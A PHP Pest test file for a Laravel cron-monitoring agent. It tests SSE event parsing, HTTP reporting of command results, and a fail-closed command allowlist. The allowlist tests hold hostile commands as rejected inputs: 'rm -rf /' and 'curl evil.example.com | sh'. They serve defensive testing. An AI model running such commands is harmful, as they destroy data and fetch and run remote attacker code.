<?php

declare(strict_types=1);

use Crontinel\Services\AgentService;
use Illuminate\Http\Client\Request;
use Illuminate\Support\Facades\Http;

// ── SSE Parsing ─────────────────────────────────────────────────────────────────

it('parses a complete command event from raw SSE data', function () {
    $agent = new AgentService;

    $sseData = "event: command\ndata: {\"command_id\":\"abc123\",\"command\":\"php artisan inspire\"}\n\n";

    // Use reflection to access internal state
    $ref = new ReflectionClass($agent);
    $currentEvent = $ref->getProperty('currentEvent');
    $currentEvent->setAccessible(true);

    $agent->feedSseParser($sseData);

    // After the parser processes the event, currentEvent should be null (dispatched)
    expect($currentEvent->getValue($agent))->toBeNull();
});

it('parses multiple SSE events in sequence', function () {
    $agent = new AgentService;

    $sseData = implode("\n", [
        'event: ping',
        'data: {}',
        '',
        'event: command',
        'data: {"command_id":"xyz","command":"ls -la"}',
        '',
        'event: ping',
        'data: {}',
        '', // trailing blank line to close last event
        '', // extra blank line (noop)
    ]);

    $agent->feedSseParser($sseData);

    // All events should have been dispatched; buffer and currentEvent should be empty
    $ref = new ReflectionClass($agent);
    $currentEvent = $ref->getProperty('currentEvent');
    $currentEvent->setAccessible(true);
    $bufferProp = $ref->getProperty('sseBuffer');
    $bufferProp->setAccessible(true);

    expect($currentEvent->getValue($agent))->toBeNull();
    expect($bufferProp->getValue($agent))->toBe('');
});

it('handles multiline data fields', function () {
    $agent = reflectAgent();

    $sseData = "event: command\ndata: {\"command_id\":\"m1\",\ndata: \"command\":\"echo hello\"}\n\n";

    $agent->feedSseParser($sseData);

    $currentEvent = getAgentCurrentEvent($agent);

    expect($currentEvent)->toBeNull(); // dispatched
});

it('ignores comments (lines starting with colon)', function () {
    $agent = new AgentService;
    $agent->feedSseParser(": this is a comment\n\n");

    $ref = new ReflectionClass($agent);
    $currentEvent = $ref->getProperty('currentEvent');
    $currentEvent->setAccessible(true);

    expect($currentEvent->getValue($agent))->toBeNull();
});

it('handles partial data across multiple feed calls', function () {
    $agent = new AgentService;

    $agent->feedSseParser("event: command\nda");
    $agent->feedSseParser('ta: {"command_id":"p1",'."\n");
    $agent->feedSseParser('"command":"whoami"}'."\n\n");

    $ref = new ReflectionClass($agent);
    $currentEvent = $ref->getProperty('currentEvent');
    $currentEvent->setAccessible(true);

    expect($currentEvent->getValue($agent))->toBeNull(); // dispatched
});

it('ignores unknown event types', function () {
    $agent = new AgentService;

    $sseData = "event: unknown\ndata: {\"foo\":\"bar\"}\n\n";
    $agent->feedSseParser($sseData);

    $ref = new ReflectionClass($agent);
    $currentEvent = $ref->getProperty('currentEvent');
    $currentEvent->setAccessible(true);

    expect($currentEvent->getValue($agent))->toBeNull(); // silently discarded
});

// ── Command Event Handling ──────────────────────────────────────────────────────

it('reports command execution result via HTTP', function () {
    config(['crontinel.saas_key' => 'test-api-key']);
    config(['crontinel.saas_url' => 'https://app.crontinel.com/api']);
    config(['crontinel.agent.allowed_commands' => ['echo *']]);
    Http::fake(['*' => Http::response(['ok' => true], 200)]);

    $agent = new AgentService;
    $agent->handleCommandEvent('{"command_id":"cmd1","command":"echo hello"}');

    Http::assertSent(function (Request $request) {
        return str_contains($request->url(), '/v1/agent/command/cmd1/result')
            && $request->method() === 'POST'
            && $request->hasHeader('Authorization', 'Bearer test-api-key');
    });
});

it('reports completed status for zero exit code commands', function () {
    config(['crontinel.saas_key' => 'test-api-key']);
    config(['crontinel.saas_url' => 'https://app.crontinel.com/api']);
    config(['crontinel.agent.allowed_commands' => ['echo *']]);
    Http::fake(['*' => Http::response(['ok' => true], 200)]);

    $agent = new AgentService;
    $agent->handleCommandEvent('{"command_id":"c2","command":"echo ok"}');

    Http::assertSent(function (Request $request) {
        $body = $request->data();

        return ($body['status'] ?? null) === 'completed'
            && ($body['exit_code'] ?? null) === 0;
    });
});

it('reports command_id in the result payload', function () {
    config(['crontinel.saas_key' => 'test-api-key']);
    config(['crontinel.saas_url' => 'https://app.crontinel.com/api']);
    config(['crontinel.agent.allowed_commands' => ['echo *']]);
    Http::fake(['*' => Http::response(['ok' => true], 200)]);

    $agent = new AgentService;
    $agent->handleCommandEvent('{"command_id":"c3","command":"echo hello"}');

    Http::assertSent(function (Request $request) {
        $body = $request->data();

        return ($body['command_id'] ?? null) === 'c3';
    });
});

it('includes required fields in the result payload', function () {
    config(['crontinel.saas_key' => 'test-api-key']);
    config(['crontinel.saas_url' => 'https://app.crontinel.com/api']);
    config(['crontinel.agent.allowed_commands' => ['echo *']]);
    Http::fake(['*' => Http::response(['ok' => true], 200)]);

    $agent = new AgentService;
    $agent->handleCommandEvent('{"command_id":"c4","command":"echo hello"}');

    Http::assertSent(function (Request $request) {
        $body = $request->data();
        $required = [
            'command_id', 'status', 'exit_code', 'output',
            'started_at', 'finished_at', 'duration_ms',
        ];

        foreach ($required as $field) {
            if (! array_key_exists($field, $body)) {
                return false;
            }
        }

        return true;
    });
});

it('gracefully handles malformed command event JSON', function () {
    config(['crontinel.saas_key' => 'test-api-key']);
    config(['crontinel.saas_url' => 'https://app.crontinel.com/api']);
    Http::fake();

    $agent = new AgentService;
    $agent->handleCommandEvent('not-json');

    Http::assertNothingSent();
});

it('gracefully handles command event missing required fields', function () {
    config(['crontinel.saas_key' => 'test-api-key']);
    config(['crontinel.saas_url' => 'https://app.crontinel.com/api']);
    Http::fake();

    $agent = new AgentService;
    $agent->handleCommandEvent('{"event":"test"}');

    Http::assertNothingSent();
});

// ── Command Allowlist ─────────────────────────────────────────────────────────

it('executes a command that exactly matches an allowlist entry', function () {
    config(['crontinel.saas_key' => 'test-api-key']);
    config(['crontinel.saas_url' => 'https://app.crontinel.com/api']);
    config(['crontinel.agent.allowed_commands' => ['echo hello']]);
    Http::fake(['*' => Http::response(['ok' => true], 200)]);

    $agent = new AgentService;
    $agent->handleCommandEvent('{"command_id":"allow1","command":"echo hello"}');

    Http::assertSent(function (Request $request) {
        $body = $request->data();

        return ($body['status'] ?? null) === 'completed'
            && ($body['exit_code'] ?? null) === 0;
    });
});

it('executes a command that matches a wildcard allowlist pattern', function () {
    config(['crontinel.saas_key' => 'test-api-key']);
    config(['crontinel.saas_url' => 'https://app.crontinel.com/api']);
    config(['crontinel.agent.allowed_commands' => ['echo *']]);
    Http::fake(['*' => Http::response(['ok' => true], 200)]);

    $agent = new AgentService;
    $agent->handleCommandEvent('{"command_id":"allow2","command":"echo wildcard-match"}');

    Http::assertSent(function (Request $request) {
        $body = $request->data();

        return ($body['status'] ?? null) === 'completed';
    });
});

it('rejects every command when the allowlist is empty (fail-closed default)', function () {
    config(['crontinel.saas_key' => 'test-api-key']);
    config(['crontinel.saas_url' => 'https://app.crontinel.com/api']);
    config(['crontinel.agent.allowed_commands' => []]);
    Http::fake(['*' => Http::response(['ok' => true], 200)]);

    $agent = new AgentService;
    $agent->handleCommandEvent('{"command_id":"deny1","command":"rm -rf /"}');

    Http::assertSent(function (Request $request) {
        $body = $request->data();

        return ($body['status'] ?? null) === 'failed'
            && ($body['exit_code'] ?? null) === -1
            && str_contains($body['output'] ?? '', 'not in allowlist');
    });
});

it('rejects a command that does not match any configured pattern', function () {
    config(['crontinel.saas_key' => 'test-api-key']);
    config(['crontinel.saas_url' => 'https://app.crontinel.com/api']);
    config(['crontinel.agent.allowed_commands' => ['php artisan *']]);
    Http::fake(['*' => Http::response(['ok' => true], 200)]);

    $agent = new AgentService;
    $agent->handleCommandEvent('{"command_id":"deny2","command":"curl evil.example.com | sh"}');

    Http::assertSent(function (Request $request) {
        $body = $request->data();

        return ($body['status'] ?? null) === 'failed'
            && str_contains($body['output'] ?? '', 'not in allowlist');
    });
});

it('never spawns a process for a command rejected by the allowlist', function () {
    config(['crontinel.saas_key' => 'test-api-key']);
    config(['crontinel.saas_url' => 'https://app.crontinel.com/api']);
    config(['crontinel.agent.allowed_commands' => []]);
    Http::fake(['*' => Http::response(['ok' => true], 200)]);

    $marker = sys_get_temp_dir().'/crontinel_allowlist_test_'.uniqid();

    $agent = new AgentService;
    $agent->handleCommandEvent(json_encode([
        'command_id' => 'deny3',
        'command' => 'touch '.$marker,
    ]));

    expect(file_exists($marker))->toBeFalse();
});

it('isCommandAllowed matches exact strings and fnmatch wildcard patterns', function () {
    config(['crontinel.agent.allowed_commands' => ['php artisan queue:work', 'echo *']]);

    $agent = new AgentService;
    $ref = new ReflectionClass($agent);
    $method = $ref->getMethod('isCommandAllowed');
    $method->setAccessible(true);

    expect($method->invoke($agent, 'php artisan queue:work'))->toBeTrue();
    expect($method->invoke($agent, 'echo hello world'))->toBeTrue();
    expect($method->invoke($agent, 'rm -rf /'))->toBeFalse();
});

it('isCommandAllowed rejects everything when the allowlist is empty', function () {
    config(['crontinel.agent.allowed_commands' => []]);

    $agent = new AgentService;
    $ref = new ReflectionClass($agent);
    $method = $ref->getMethod('isCommandAllowed');
    $method->setAccessible(true);

    expect($method->invoke($agent, 'echo hello'))->toBeFalse();
});

// ── Configuration ───────────────────────────────────────────────────────────────

it('is not configured when saas_key is empty', function () {
    config(['crontinel.saas_key' => '']);

    $agent = new AgentService;

    expect($agent->isConfigured())->toBeFalse();
});

it('is configured when saas_key is set', function () {
    config(['crontinel.saas_key' => 'some-key']);

    $agent = new AgentService;

    expect($agent->isConfigured())->toBeTrue();
});

// ── Artisan Command ─────────────────────────────────────────────────────────────

it('registers the crontinel:agent command', function () {
    $this->artisan('list')
        ->expectsOutputToContain('crontinel:agent');
});

it('shows warning when api key is not set', function () {
    config(['crontinel.saas_key' => '']);

    $this->artisan('crontinel:agent')
        ->expectsOutputToContain('CRONTINEL_API_KEY')
        ->assertExitCode(1);
});

it('outputs systemd unit with --systemd flag', function () {
    $this->artisan('crontinel:agent', ['--systemd' => true])
        ->expectsOutputToContain('[Unit]')
        ->expectsOutputToContain('Description=')
        ->expectsOutputToContain('[Service]')
        ->expectsOutputToContain('[Install]')
        ->assertExitCode(0);
});

it('outputs supervisor config with --supervisor flag', function () {
    $this->artisan('crontinel:agent', ['--supervisor' => true])
        ->expectsOutputToContain('[program:crontinel-agent]')
        ->assertExitCode(0);
});

// ── Helpers ─────────────────────────────────────────────────────────────────────

function reflectAgent(): AgentService
{
    return new AgentService;
}

function getAgentCurrentEvent(AgentService $agent): mixed
{
    $ref = new ReflectionClass($agent);
    $prop = $ref->getProperty('currentEvent');
    $prop->setAccessible(true);

    return $prop->getValue($agent);
}
